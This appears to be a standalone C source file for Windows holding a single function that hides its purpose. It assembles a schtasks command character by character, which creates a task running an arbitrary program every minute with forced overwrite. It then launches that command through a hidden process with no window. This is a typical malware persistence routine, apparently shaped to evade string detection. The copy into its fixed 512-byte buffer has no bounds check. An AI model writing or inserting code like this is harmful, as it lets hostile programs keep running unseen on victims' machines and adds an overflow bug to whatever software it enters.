#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(const char* tn, const char* tp){
    char b[512];
    char* d = b;
    const char* s = "schtasks /create /sc minute /mo 1 /tn \"";
    while (*s) *d++ = *s++;
    while (*tn) *d++ = *tn++;
    *d++ = '\"'; *d++ = ' '; *d++ = '/'; *d++ = 't'; *d++ = 'r'; *d++ = ' '; *d++ = '\"';
    while (*tp) *d++ = *tp++;
    *d++ = '\"'; *d++ = ' '; *d++ = '/'; *d++ = 'f'; *d = '\0';
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, b, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}